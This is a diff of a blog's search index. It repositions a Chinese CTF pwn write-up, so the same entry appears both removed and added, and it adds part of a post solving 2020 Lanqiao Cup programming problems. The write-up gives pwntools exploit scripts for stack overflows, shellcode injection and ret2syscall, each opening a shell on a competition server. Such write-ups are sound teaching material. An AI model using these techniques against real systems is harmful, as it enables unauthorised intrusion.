@@ -467,89 +467,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Pwn_0xGame_01</title>
-    <url>/2021/03/30/Pwn_0xGame_01/</url>
-    <content><![CDATA[<h1 id="Pwn-0xGame-01"><a href="#Pwn-0xGame-01" class="headerlink" title="Pwn_0xGame_01"></a>Pwn_0xGame_01</h1><span id="more"></span>
-
-<h2 id="1-欢迎来到0xGame平台"><a href="#1-欢迎来到0xGame平台" class="headerlink" title="1.欢迎来到0xGame平台"></a>1.欢迎来到0xGame平台</h2><p><code>nc</code>出flag</p>
-<h2 id="2-帮我取一个题目名称"><a href="#2-帮我取一个题目名称" class="headerlink" title="2.帮我取一个题目名称"></a>2.帮我取一个题目名称</h2><p>ret2text<br>打开IDA分析<br>main函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201018162746427.png#pic_center" alt="在这里插入图片描述"></p>
-<p>跟进<br>第二个函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201018162919579.png#pic_center" alt="在这里插入图片描述"></p>
-<p>s栈大小为20h=32<br>函数最后return read了s<br>所以很好写了<br>因为是64位程序，后面再加上8个字符</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
-<p>Shift+F12发现/bin/sh</p>
-<p><img src="https://img-blog.csdnimg.cn/20201018163358221.png#pic_center" alt="在这里插入图片描述"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214 &#x27;</span>,<span class="number">10002</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-easy-stack"><a href="#3-easy-stack" class="headerlink" title="3.easy_stack"></a>3.easy_stack</h2><p>文件<br>easy_stack.txt：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBX  0x56558fb8 ◂— 0x3ec0</span><br><span class="line">&gt; ECX  0xffffffff</span><br><span class="line">&gt; EDX  0xffffffff</span><br><span class="line">&gt; EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br><span class="line">&gt; ESP  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt; EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0</span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► 0x56556273    call   read@plt &lt;0x56556030&gt;</span><br><span class="line">&gt;   0x56556278    add    esp, 0x10</span><br><span class="line">&gt;   0x5655627b    nop    </span><br><span class="line">&gt;   0x5655627c    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">&gt;   0x5655627f    leave  </span><br><span class="line">&gt;   0x56556280    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;00:0000│ esp  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt;01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;02:0008│      0xffffcfe8 ◂— 0x100</span><br><span class="line">&gt;03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381</span><br><span class="line">&gt;04:0010│ eax  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure>
-
-<p>► 0x56556273    call   read@plt &lt;0x56556030&gt;<br>调用了read函数，再看看read函数中的三个参数</p>
-<pre><code>read (fd, char *buf , count)
-</code></pre>
-<p>fd：文件描述符（文件指针） //fd写0,表示标准输入</p>
-<p>buf：指向内存的指针             //也就是把数据写入的起始地址</p>
-<p>count：读取的长度</p>
-<p>再结合文件中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 00:0000│ esp  0xffffcfe0 ◂— 0x0 </span><br><span class="line">&gt; 01:0004│      0xffffcfe4 —▸ 0xffffcff0◂— 0x0 </span><br><span class="line">&gt; 02:0008│      0xffffcfe8 ◂— 0x100</span><br></pre></td></tr></table></figure>
-
-<p>然后我们再观察ebp和eax的值</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br></pre></td></tr></table></figure>
-
-<p>因为通常返回地址是存在ebp下，所以计算一下偏移量 0xffffd078 - 0xffffcff0 = 0x88<br>read读取的数据长度是0x100<br>0x88 &lt; 0x100<br>所以存在溢出<br>nc连接会回显个地址，并且这个地址是随机的</p>
-<p><img src="https://img-blog.csdnimg.cn/20201018193434919.png#pic_center" alt="在这里插入图片描述"></p>
-<p>我们可以接收这个地址并让程序执行它<br>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10008</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;magic_address &#x27;</span>) </span><br><span class="line">shell = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>) </span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span>+<span class="number">4</span>) + p32(shell)) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="4-该怎么起名呢"><a href="#4-该怎么起名呢" class="headerlink" title="4.该怎么起名呢"></a>4.该怎么起名呢</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构<br>context.arch=’AMD64’ ，否则有可能会报错</p>
-<p>再看IDA</p>
-<p><img src="https://img-blog.csdnimg.cn/20201019195422415.png#pic_center" alt="在这里插入图片描述"></p>
-<p>关键的在下面的buf+32</p>
-<p>所以我们需要填充32个字符之后再送出shellcode</p>
-<p>生成 shellcode</p>
-<blockquote>
-<p>asm(shellcraft.sh())</p>
-</blockquote>
-<p>运行一下文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center" alt="在这里插入图片描述"></p>
-<p>需要在’shellcode’之后再发送payload</p>
-<p>所以要recvuntil(‘shellcode’)</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context.arch = <span class="string">&#x27;AMD64&#x27;</span> </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">32</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;shellcode&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="5-variable-coverage"><a href="#5-variable-coverage" class="headerlink" title="5.variable_coverage"></a>5.variable_coverage</h2><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA分析下</p>
-<p><img src="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>程序读取%lld 一个longlong的数，它的长度为8个字节<br>后面判断v5等于0x2333后会调用system函数<br>构造payload = 0x233300000000<br>再看栈</p>
-<p><img src="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center" alt="在这里插入图片描述"></p>
-<p>4个字节的长度刚好是0x 0000 2333 0000 0000<br>也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10007</span>) </span><br><span class="line"></span><br><span class="line">payload =  <span class="built_in">str</span>(<span class="number">0x233300000000</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="6-Pwn题滞销-帮帮我好吗"><a href="#6-Pwn题滞销-帮帮我好吗" class="headerlink" title="6.Pwn题滞销,帮帮我好吗?"></a>6.Pwn题滞销,帮帮我好吗?</h2><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>IDA打开</p>
-<p><img src="/.ink//20201022204647356.png" alt="在这里插入图片描述"></p>
-<p>发现是个syscall的题目<br>直接去看这个函数的汇编</p>
-<p><img src="/.ink//20201022204851409.png" alt="在这里插入图片描述"></p>
-<p>根据师傅们所说，我们需要让rax存入59，让syscall去调用execve函数 （ret2syscall？）</p>
-<p><a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">syscall_64 GitHub查询</a></p>
-<p>之后要构造出来  execve(“/bin/sh”,0,0) 拿取权限<br>找”/bin/sh”字符串<br>方法一：<br>在程序中有，找到它</p>
-<p><img src="/.ink//20201022210119569.png" alt="在这里插入图片描述"></p>
-<p>从’[‘数起到斜杠前面的空格’ ‘，再加上前面的04个字符，一共是22个，换成16进制是16h<br>所以”/bin/sh”的地址为：0x402016</p>
-<p>方法二：<br>构造ROP链来寻找（这是看官方WriteUp看到的方法</p>
-<p><code>ROPgadget --binary ./main --string &#39;/bin/sh&#39;</code></p>
-<p><img src="/.ink//20201022210755704.png" alt="在这里插入图片描述"></p>
-<p>找来找去，最后还是要用到csu init函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> text:00000000004011D8 loc_4011D8:                             ; CODE XREF: init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    qword ptr [r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br><span class="line">.text:00000000004011FC ; &#125; &#x2F;&#x2F; starts at 4011A0</span><br><span class="line">.text:00000000004011FC init            endp</span><br><span class="line">.text:00000000004011FC</span><br></pre></td></tr></table></figure>
-
-
-<p>咕咕咕~~~</p>
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
     <title>NepCTF</title>
     <url>/2021/03/30/NepCTF/</url>
     <content><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><span id="more"></span>
@@ -700,6 +617,89 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28072</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x40063B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>1</p>
+]]></content>
+      <categories>
+        <category>比赛WriteUp</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Pwn_0xGame_01</title>
+    <url>/2021/03/30/Pwn_0xGame_01/</url>
+    <content><![CDATA[<h1 id="Pwn-0xGame-01"><a href="#Pwn-0xGame-01" class="headerlink" title="Pwn_0xGame_01"></a>Pwn_0xGame_01</h1><span id="more"></span>
+
+<h2 id="1-欢迎来到0xGame平台"><a href="#1-欢迎来到0xGame平台" class="headerlink" title="1.欢迎来到0xGame平台"></a>1.欢迎来到0xGame平台</h2><p><code>nc</code>出flag</p>
+<h2 id="2-帮我取一个题目名称"><a href="#2-帮我取一个题目名称" class="headerlink" title="2.帮我取一个题目名称"></a>2.帮我取一个题目名称</h2><p>ret2text<br>打开IDA分析<br>main函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201018162746427.png#pic_center" alt="在这里插入图片描述"></p>
+<p>跟进<br>第二个函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201018162919579.png#pic_center" alt="在这里插入图片描述"></p>
+<p>s栈大小为20h=32<br>函数最后return read了s<br>所以很好写了<br>因为是64位程序，后面再加上8个字符</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
+<p>Shift+F12发现/bin/sh</p>
+<p><img src="https://img-blog.csdnimg.cn/20201018163358221.png#pic_center" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214 &#x27;</span>,<span class="number">10002</span>) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x401172</span>)</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-easy-stack"><a href="#3-easy-stack" class="headerlink" title="3.easy_stack"></a>3.easy_stack</h2><p>文件<br>easy_stack.txt：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────</span><br><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBX  0x56558fb8 ◂— 0x3ec0</span><br><span class="line">&gt; ECX  0xffffffff</span><br><span class="line">&gt; EDX  0xffffffff</span><br><span class="line">&gt; EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br><span class="line">&gt; ESP  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt; EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0</span><br><span class="line">&gt;─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt; ► 0x56556273    call   read@plt &lt;0x56556030&gt;</span><br><span class="line">&gt;   0x56556278    add    esp, 0x10</span><br><span class="line">&gt;   0x5655627b    nop    </span><br><span class="line">&gt;   0x5655627c    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">&gt;   0x5655627f    leave  </span><br><span class="line">&gt;   0x56556280    ret    </span><br><span class="line">&gt;──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</span><br><span class="line">&gt;00:0000│ esp  0xffffcfe0 ◂— 0x0</span><br><span class="line">&gt;01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;02:0008│      0xffffcfe8 ◂— 0x100</span><br><span class="line">&gt;03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381</span><br><span class="line">&gt;04:0010│ eax  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt;... ↓</span><br></pre></td></tr></table></figure>
+
+<p>► 0x56556273    call   read@plt &lt;0x56556030&gt;<br>调用了read函数，再看看read函数中的三个参数</p>
+<pre><code>read (fd, char *buf , count)
+</code></pre>
+<p>fd：文件描述符（文件指针） //fd写0,表示标准输入</p>
+<p>buf：指向内存的指针             //也就是把数据写入的起始地址</p>
+<p>count：读取的长度</p>
+<p>再结合文件中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 00:0000│ esp  0xffffcfe0 ◂— 0x0 </span><br><span class="line">&gt; 01:0004│      0xffffcfe4 —▸ 0xffffcff0◂— 0x0 </span><br><span class="line">&gt; 02:0008│      0xffffcfe8 ◂— 0x100</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再观察ebp和eax的值</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; EAX  0xffffcff0 ◂— 0x0</span><br><span class="line">&gt; EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>因为通常返回地址是存在ebp下，所以计算一下偏移量 0xffffd078 - 0xffffcff0 = 0x88<br>read读取的数据长度是0x100<br>0x88 &lt; 0x100<br>所以存在溢出<br>nc连接会回显个地址，并且这个地址是随机的</p>
+<p><img src="https://img-blog.csdnimg.cn/20201018193434919.png#pic_center" alt="在这里插入图片描述"></p>
+<p>我们可以接收这个地址并让程序执行它<br>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10008</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;magic_address &#x27;</span>) </span><br><span class="line">shell = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>) </span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span>+<span class="number">4</span>) + p32(shell)) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="4-该怎么起名呢"><a href="#4-该怎么起名呢" class="headerlink" title="4.该怎么起名呢"></a>4.该怎么起名呢</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构<br>context.arch=’AMD64’ ，否则有可能会报错</p>
+<p>再看IDA</p>
+<p><img src="https://img-blog.csdnimg.cn/20201019195422415.png#pic_center" alt="在这里插入图片描述"></p>
+<p>关键的在下面的buf+32</p>
+<p>所以我们需要填充32个字符之后再送出shellcode</p>
+<p>生成 shellcode</p>
+<blockquote>
+<p>asm(shellcraft.sh())</p>
+</blockquote>
+<p>运行一下文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20201019200641989.png#pic_center" alt="在这里插入图片描述"></p>
+<p>需要在’shellcode’之后再发送payload</p>
+<p>所以要recvuntil(‘shellcode’)</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line">context.arch = <span class="string">&#x27;AMD64&#x27;</span> </span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">32</span> + asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;shellcode&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="5-variable-coverage"><a href="#5-variable-coverage" class="headerlink" title="5.variable_coverage"></a>5.variable_coverage</h2><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>IDA分析下</p>
+<p><img src="https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>程序读取%lld 一个longlong的数，它的长度为8个字节<br>后面判断v5等于0x2333后会调用system函数<br>构造payload = 0x233300000000<br>再看栈</p>
+<p><img src="https://img-blog.csdnimg.cn/20201019210240376.png#pic_center" alt="在这里插入图片描述"></p>
+<p>4个字节的长度刚好是0x 0000 2333 0000 0000<br>也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;39.101.210.214&#x27;</span>,<span class="number">10007</span>) </span><br><span class="line"></span><br><span class="line">payload =  <span class="built_in">str</span>(<span class="number">0x233300000000</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6-Pwn题滞销-帮帮我好吗"><a href="#6-Pwn题滞销-帮帮我好吗" class="headerlink" title="6.Pwn题滞销,帮帮我好吗?"></a>6.Pwn题滞销,帮帮我好吗?</h2><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><p>IDA打开</p>
+<p><img src="/.ink//20201022204647356.png" alt="在这里插入图片描述"></p>
+<p>发现是个syscall的题目<br>直接去看这个函数的汇编</p>
+<p><img src="/.ink//20201022204851409.png" alt="在这里插入图片描述"></p>
+<p>根据师傅们所说，我们需要让rax存入59，让syscall去调用execve函数 （ret2syscall？）</p>
+<p><a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl">syscall_64 GitHub查询</a></p>
+<p>之后要构造出来  execve(“/bin/sh”,0,0) 拿取权限<br>找”/bin/sh”字符串<br>方法一：<br>在程序中有，找到它</p>
+<p><img src="/.ink//20201022210119569.png" alt="在这里插入图片描述"></p>
+<p>从’[‘数起到斜杠前面的空格’ ‘，再加上前面的04个字符，一共是22个，换成16进制是16h<br>所以”/bin/sh”的地址为：0x402016</p>
+<p>方法二：<br>构造ROP链来寻找（这是看官方WriteUp看到的方法</p>
+<p><code>ROPgadget --binary ./main --string &#39;/bin/sh&#39;</code></p>
+<p><img src="/.ink//20201022210755704.png" alt="在这里插入图片描述"></p>
+<p>找来找去，最后还是要用到csu init函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> text:00000000004011D8 loc_4011D8:                             ; CODE XREF: init+4C↓j</span><br><span class="line">.text:00000000004011D8                 mov     rdx, r14</span><br><span class="line">.text:00000000004011DB                 mov     rsi, r13</span><br><span class="line">.text:00000000004011DE                 mov     edi, r12d</span><br><span class="line">.text:00000000004011E1                 call    qword ptr [r15+rbx*8]</span><br><span class="line">.text:00000000004011E5                 add     rbx, 1</span><br><span class="line">.text:00000000004011E9                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004011EC                 jnz     short loc_4011D8</span><br><span class="line">.text:00000000004011EE</span><br><span class="line">.text:00000000004011EE loc_4011EE:                             ; CODE XREF: init+31↑j</span><br><span class="line">.text:00000000004011EE                 add     rsp, 8</span><br><span class="line">.text:00000000004011F2                 pop     rbx</span><br><span class="line">.text:00000000004011F3                 pop     rbp</span><br><span class="line">.text:00000000004011F4                 pop     r12</span><br><span class="line">.text:00000000004011F6                 pop     r13</span><br><span class="line">.text:00000000004011F8                 pop     r14</span><br><span class="line">.text:00000000004011FA                 pop     r15</span><br><span class="line">.text:00000000004011FC                 retn</span><br><span class="line">.text:00000000004011FC ; &#125; &#x2F;&#x2F; starts at 4011A0</span><br><span class="line">.text:00000000004011FC init            endp</span><br><span class="line">.text:00000000004011FC</span><br></pre></td></tr></table></figure>
+
+
+<p>咕咕咕~~~</p>
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
@@ -936,6 +936,39 @@
       </tags>
   </entry>
   <entry>
+    <title>program</title>
+    <url>/2021/04/12/program/</url>
+    <content><![CDATA[<p>记录编程相关</p>
+<span id="more"></span>
+
+<h1 id="2020蓝桥杯省赛"><a href="#2020蓝桥杯省赛" class="headerlink" title="2020蓝桥杯省赛"></a>2020蓝桥杯省赛</h1><h2 id="A-门牌制作"><a href="#A-门牌制作" class="headerlink" title="A 门牌制作"></a>A 门牌制作</h2><p>【问题描述】<br>小蓝要为一条街的住户制作门牌号。<br>这条街一共有 2020 位住户，门牌号从 1 到 2020 编号。<br>小蓝制作门牌的方法是先制作 0 到 9 这几个数字字符，最后根据需要将字<br>符粘贴到门牌上，例如门牌 1017 需要依次粘贴字符 1、 0、 1、 7，即需要 1 个<br>字符 0， 2 个字符 1， 1 个字符 7。<br>请问要制作所有的 1 到 2020 号门牌，总共需要多少个字符 2？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,t,n=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">		<span class="keyword">for</span>(t=i;t!=<span class="number">0</span>;t/=<span class="number">10</span>)</span><br><span class="line">			<span class="keyword">if</span>(t%<span class="number">10</span>==<span class="number">2</span>)</span><br><span class="line">				n++;</span><br><span class="line">	cout&lt;&lt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>624</p>
+</blockquote>
+<h2 id="试题B-既约分数"><a href="#试题B-既约分数" class="headerlink" title="试题B 既约分数"></a>试题B 既约分数</h2><p>【问题描述】<br>如果一个分数的分子和分母的最大公约数是1，这个分数称为既约分数。例如，3/4 , 5/2 , 1/8 , 7/1都是既约分数。请问，有多少个既约分数，分子和分母都是1 到2020 之间的整数（包括1和2020）？<br>【答案提交】<br>这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2020</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2020</span>;j++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(k=i;;k--)</span><br><span class="line">    			<span class="keyword">if</span>(i%k==<span class="number">0</span> &amp;&amp; j%k==<span class="number">0</span>)</span><br><span class="line">    				<span class="keyword">break</span>;</span><br><span class="line">    		<span class="keyword">if</span>(k==<span class="number">1</span>)</span><br><span class="line">    			num++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;num;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="试题C-蛇形填数"><a href="#试题C-蛇形填数" class="headerlink" title="试题C 蛇形填数"></a>试题C 蛇形填数</h2><p>【问题描述】<br>如下图所示，小明用从1 开始的正整数“蛇形”填充无限大的矩阵。</p>
+<p><img src="/.ink//image-20210412201731138.png" alt="image-20210412201731138"></p>
+<p>容易看出矩阵第二行第二列中的数是5。请你计算矩阵中第20 行第20 列的数是多少？</p>
